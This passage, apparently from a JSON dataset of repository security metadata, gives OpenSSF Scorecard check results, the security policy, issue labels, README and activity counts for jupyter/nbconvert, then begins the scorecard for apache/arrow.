org/company found, pylab contributor org/company found, sfstoolbox contributor org/company found, pystruct contributor org/company found, libRocket contributor org/company found, quansight-labs contributor org/company found, nteract contributor org/company found, Jupyter-contrib contributor org/company found, voila-gallery contributor org/company found, jupyter-lsp contributor org/company found, conda-forge contributor org/company found, jovyan contributor org/company found, panosc-eu contributor org/company found, cytoscape contributor org/company found, scipy-conference contributor org/company found, pangeo-data contributor org/company found, recursecenter contributor org/company found, jupyterhub contributor org/company found, ucmerced contributor org/company found, phosphorjs contributor org/company found, farallon-2i2c contributor org/company found, pexpect contributor org/company found, JuliaInterop contributor org/company found, jupyter-xeus contributor org/company found, systers contributor org/company found, sagemath contributor org/company found, microsoft contributor org/company found, amperser contributor org/company found, OpenDreamKit contributor org/company found, mamba-org contributor org/company found, jupyter-incubator contributor org/company found, pydata contributor org/company found, NYUCCL contributor org/company found, AudioSceneDescriptionFormat contributor org/company found, jupytercon contributor org/company found, databricks contributor org/company found, qsnake contributor org/company found, noteable-io contributor org/company found, ICESAT-2HackWeek contributor org/company found, mongodb contributor org/company found, pybind contributor org/company found, compmodels contributor org/company found, JuliaLang contributor org/company found, python3statement contributor org/company found, NFAcademy contributor org/company found, scientific-python contributor org/company found, sympy contributor org/company found, jupytercalpoly contributor org/company found, AudioProcessingFramework contributor org/company found, joommf contributor org/company found, jupyter-resources contributor org/company found, european xfel contributor org/company found, willing consulting contributor org/company found, google contributor org/company found, IRkernel contributor org/company found, bqplot contributor org/company found, cocotools contributor org/company found, python-modernize contributor org/company found, spyder-ide contributor org/company found, numfocus contributor org/company found, nipy contributor org/company found, thehackerwithin contributor org/company found, 10gen contributor org/company found, pyladies contributor org/company found, European-XFEL contributor org/company found, quantstack contributor org/company found, getnikola contributor org/company found, labyrinth-team contributor org/company found, computationalmodelling contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 132 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 6,
                    "reason": "3 commit(s) and 5 issue activity found in the last 90 days -- score normalized to 6",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:20: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/docs.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/docs.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:41: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/docs.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs.yml:50: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/docs.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/enforce-label.yml:13: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/enforce-label.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:28: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/prep-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/prep-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:22: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/publish-release.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:32: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/publish-release.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/publish-release.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/publish-release.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:66: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:67: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:73: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:74: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:86: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:87: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:89: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:111: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:134: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:135: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:148: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:149: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:150: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:158: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:159: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:36: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:59: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/tests.yml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:99: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:100: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/tests.yml:174: update your workflow using https://app.stepsecurity.io/secureworkflow/jupyter/nbconvert/tests.yml/main?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/docs.yml:32",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yml:89",
                        "Info:   0 out of  12 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  22 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 23 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/jupyter/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/jupyter/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v7.16.4 not signed: https://api.github.com/repos/jupyter/nbconvert/releases/153272884",
                        "Warn: release artifact v7.16.3 not signed: https://api.github.com/repos/jupyter/nbconvert/releases/147786006",
                        "Warn: release artifact v7.16.2 not signed: https://api.github.com/repos/jupyter/nbconvert/releases/144679000",
                        "Warn: release artifact v7.16.1 not signed: https://api.github.com/repos/jupyter/nbconvert/releases/142583973",
                        "Warn: release artifact v7.16.0 not signed: https://api.github.com/repos/jupyter/nbconvert/releases/140327992",
                        "Warn: release artifact v7.16.4 does not have provenance: https://api.github.com/repos/jupyter/nbconvert/releases/153272884",
                        "Warn: release artifact v7.16.3 does not have provenance: https://api.github.com/repos/jupyter/nbconvert/releases/147786006",
                        "Warn: release artifact v7.16.2 does not have provenance: https://api.github.com/repos/jupyter/nbconvert/releases/144679000",
                        "Warn: release artifact v7.16.1 does not have provenance: https://api.github.com/repos/jupyter/nbconvert/releases/142583973",
                        "Warn: release artifact v7.16.0 does not have provenance: https://api.github.com/repos/jupyter/nbconvert/releases/140327992"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: jobLevel 'contents' permission set to 'write': .github/workflows/prep-release.yml:26",
                        "Warn: no topLevel permission defined: .github/workflows/docs.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/enforce-label.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/prep-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish-release.yml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yml:1"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/jupyter/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "Security Policy\n\n## Reporting a Vulnerability\n\nIf you find a security vulnerability in Jupyter, please report it to security@ipython.org.\n\nSee more information in our [docs](https://jupyter.org/security).\n",
        "project_all_labels": [
            "Accessibility",
            "best practice",
            "bug",
            "Closed PR",
            "dependencies",
            "docs",
            "documentation",
            "duplicate",
            "enhancement",
            "format:AsciiDoc",
            "format:HTML",
            "format:LaTeX",
            "format:Markdown",
            "format:Notebook",
            "format:PDF",
            "format:ReST",
            "format:Script",
            "format:Slides",
            "good first issue",
            "help wanted",
            "maintenance",
            "not nbconvert",
            "Preprocessor",
            "Preprocessor:ClearMetadata",
            "Preprocessor:ClearOutput",
            "Preprocessor:ConvertFigures",
            "Preprocessor:CSSHTMLHeader",
            "Preprocessor:Execute",
            "Preprocessor:ExtractOutput",
            "Preprocessor:HighlightMagics",
            "Preprocessor:Latex",
            "Preprocessor:RegexRemove",
            "Preprocessor:SVG2PDF",
            "Preprocessor:TagRemove",
            "python",
            "question",
            "status:need-maintainer-info",
            "status:needs_discussion",
            "status:needs-info",
            "status:pending-jep",
            "status:work-in-process",
            "upstream",
            "windows",
            "workaround known"
        ],
        "README_content": "# nbconvert\n\n### Jupyter Notebook Conversion\n\n[![Build Status](https://github.com/jupyter/nbconvert/actions/workflows/tests.yml/badge.svg?query=branch%3Amain++)](https://github.com/jupyter/nbconvert/actions/workflows/tests.yml/badge.svg?query=branch%3Amain++)\n[![Documentation Status](https://readthedocs.org/projects/nbconvert/badge/?version=latest)](https://nbconvert.readthedocs.io/en/latest/?badge=latest)\n\nThe **nbconvert** tool, `jupyter nbconvert`, converts notebooks to various other\nformats via [Jinja] templates. The nbconvert tool allows you to convert an\n`.ipynb` notebook file into various static formats including:\n\n- HTML\n- LaTeX\n- PDF\n- Reveal JS\n- Markdown (md)\n- ReStructured Text (rst)\n- executable script\n\n## Usage\n\nFrom the command line, use nbconvert to convert a Jupyter notebook (_input_) to a\na different format (_output_). The basic command structure is:\n\n```\n$ jupyter nbconvert --to <output format> <input notebook>\n```\n\nwhere `<output format>` is the desired output format and `<input notebook>` is the\nfilename of the Jupyter notebook.\n\n### Example: Convert a notebook to HTML\n\nConvert Jupyter notebook file, `mynotebook.ipynb`, to HTML using:\n\n```\n$ jupyter nbconvert --to html mynotebook.ipynb\n```\n\nThis command creates an HTML output file named `mynotebook.html`.\n\n## Dev Install\n\nCheck if pandoc is installed (`pandoc --version`); if needed, install:\n\n```\nsudo apt-get install pandoc\n```\n\nOr\n\n```\nbrew install pandoc\n```\n\nInstall nbconvert for development using:\n\n```\ngit clone https://github.com/jupyter/nbconvert.git\ncd nbconvert\npip install -e .\n```\n\nRunning the tests after a dev install above:\n\n```\npip install nbconvert[test]\npy.test --pyargs nbconvert\n```\n\n## Documentation\n\n- [Documentation for Jupyter nbconvert](https://nbconvert.readthedocs.io/en/latest/)\n- [nbconvert examples on GitHub](https://github.com/jupyter/nbconvert-examples)\n- [Documentation for Project Jupyter](https://jupyter.readthedocs.io/en/latest/index.html)\n\n## Technical Support\n\n- [Issues and Bug Reports](https://github.com/jupyter/nbconvert/issues): A place to report\n  bugs or regressions found for nbconvert\n- [Community Technical Support and Discussion - Discourse](https://discourse.jupyter.org/): A place for\n  installation, configuration, and troubleshooting assistannce by the Jupyter community.\n  As a non-profit project and maintainers who are primarily volunteers, we encourage you\n  to ask questions and share your knowledge on Discourse.\n\n## Jupyter Resources\n\n- [Jupyter mailing list](https://groups.google.com/forum/#!forum/jupyter)\n- [Project Jupyter website](https://jupyter.org)\n\n## About the Jupyter Development Team\n\nThe Jupyter Development Team is the set of all contributors to the Jupyter project.\nThis includes all of the Jupyter subprojects.\n\nThe core team that coordinates development on GitHub can be found here:\nhttps://github.com/jupyter/.\n\n## Our Copyright Policy\n\nJupyter uses a shared copyright model. Each contributor maintains copyright\nover their contributions to Jupyter. But, it is important to note that these\ncontributions are typically only changes to the repositories. Thus, the Jupyter\nsource code, in its entirety is not the copyright of any single person or\ninstitution.  Instead, it is the collective copyright of the entire Jupyter\nDevelopment Team.  If individual contributors want to maintain a record of what\nchanges/contributions they have specific copyright on, they should indicate\ntheir copyright in the commit message of the change, when they commit the\nchange to one of the Jupyter repositories.\n\nWith this in mind, the following banner should be used in any source code file\nto indicate the copyright and license terms:\n\n```\n# Copyright (c) Jupyter Development Team.\n# Distributed under the terms of the Modified BSD License.\n```\n\n[jinja]: http://jinja.pocoo.org/\n",
        "num_commits": 4065,
        "project_age_days": 3491,
        "project_created_at": "2015-04-09",
        "latest_updated_at": "2024-10-28",
        "latest_pushed_at": "2024-09-02",
        "num_contributors": 248,
        "num_pull": 991,
        "num_issues": 2185,
        "num_opening_issue": 569,
        "project_size(kB)": 5406,
        "num_stargazers": 1735,
        "num_watchers": 1735,
        "num_forks": 567,
        "num_subscribers": 50,
        "SecurityPolicy_created_at": "2022-05-30 14:04:22",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "6531b7bcc190c5a0f48f4ca982e977dcaff888da",
                "url": "https://github.com/jupyter/.github/commit/6531b7bcc190c5a0f48f4ca982e977dcaff888da",
                "date": "2022-08-01 14:37:10"
            },
            {
                "commit_id": "c99681009485f9332e90b13c1e122a04fbe8d6c4",
                "url": "https://github.com/jupyter/.github/commit/c99681009485f9332e90b13c1e122a04fbe8d6c4",
                "date": "2022-05-30 14:04:22"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": false
    },
    {
        "project_name": "apache/arrow",
        "project_url": "https://github.com/apache/arrow",
        "SSF": {
            "date": "2024-10-29T21:47:59+07:00",
            "repo": {
                "name": "github.com/apache/arrow",
                "commit": "6c95dfa2771ad3462c3a4e7a9e74ab4409a79c92"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.6,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 out of 30 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "Found 19/23 approved changesets -- score normalized to 8",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: posit-pbc contributor org/company found, tomahawk-player contributor org/company found, lancedb contributor org/company found, arm contributor org/company found, openmensa contributor org/company found, PyCampES contributor org/company found, nteract contributor org/company found, apache contributor org/company found, daskos contributor org/company found, scikit-learn contributor org/company found, Toblerity contributor org/company found, nskicpp contributor org/company found, python-spain contributor org/company found, cmu apple contributor org/company found, groonga contributor org/company found, ruby-gnome contributor org/company found, ibis-project contributor org/company found, python contributor org/company found, conda-incubator contributor org/company found, frictionlessdata contributor org/company found, nroonga contributor org/company found, Quantco contributor org/company found, CornellCSWiki contributor org/company found, vega contributor org/company found, cmudig contributor org/company found, clear-code contributor org/company found, ruby contributor org/company found, conda-forge contributor org/company found, scientific-python contributor org/company found, CSE512-15S contributor org/company found, publicos-pt contributor org/company found, Optable contributor org/company found, ranguba contributor org/company found, datapad contributor org/company found, hubot-archive contributor org/company found, geopandas contributor org/company found, python-madrid contributor org/company found, substrait-io contributor org/company found, stadtlandcode contributor org/company found, cse512-19s contributor org/company found, rabbit-shocker contributor org/company found, logaling contributor org/company found, RubyData contributor org/company found, numpy contributor org/company found, uwdata contributor org/company found, crosstype contributor org/company found, tagshot contributor org/company found, anyscale contributor org/company found, taiyaki contributor org/company found, milter-manager contributor org/company found, test-unit contributor org/company found, datafusion-contrib contributor org/company found, pydata contributor org/company found, RoaringBitmap contributor org/company found, spacegraphcats contributor org/company found, MakingDataVisual contributor org/company found, hiki contributor org/company found, uim contributor org/company found, dask contributor org/company found, python-sprints contributor org/company found, data-apis contributor org/company found, Telefonica contributor org/company found, pgroonga contributor org/company found, llvm contributor org/company found, python-compilers-workshop contributor org/company found, CSE512-14W contributor org/company found, rr contributor org/company found, sympy contributor org/company found, EuroPython contributor org/company found, apple contributor org/company found, uwdb contributor org/company found, rurema contributor org/company found, oss-gate contributor org/company found, quantco contributor org/company found, mroonga contributor org/company found, pygeos contributor org/company found, OpenSourceCornell contributor org/company found, munin data aps contributor org/company found, tidyverse contributor org/company found, jupyterlab contributor org/company found, voltrondata contributor org/company found, rhoket-scientists contributor org/company found, activeldap contributor org/company found, rake-compiler contributor org/company found, statsmodels contributor org/company found, cloudpipe contributor org/company found, CodeforKarlsruhe contributor org/company found, data-engineering-collective contributor org/company found, duckdb-wasm-examples contributor org/company found, voltron data contributor org/company found, rcairo contributor org/company found, ruby-gettext contributor org/company found, regro contributor org/company found, shapely contributor org/company found, react-monaco-editor contributor org/company found, red-data-tools contributor org/company found, pandas-dev contributor org/company found, HaDiNet contributor org/company found, paris-saclay-cds contributor org/company found, uwescience contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 100 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: .github/dependabot.yml:1"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Info: OSSFuzz integration found",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/file_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/stream_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/tensor_stream_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/parquet/arrow/fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/file_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/stream_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/arrow/ipc/tensor_stream_fuzz.cc:21",
                        "Info: CppLibFuzzer integration found: cpp/src/parquet/arrow/fuzz.cc:21"
                    ],
                    "score": 10,
                    "reason": "project is fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: Apache License 2.0: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 20 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/cpp.yml:121"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: \"if <cond>\" must be followed by \"then\": ci/docker/python-wheel-windows-test-vs2019.dockerfile:52-56",
                        "Info: Possibly incomplete results: error parsing shell code: \"if <cond>\" must be followed by \"then\": ci/docker/python-wheel-windows-vs2019.dockerfile:82-86",
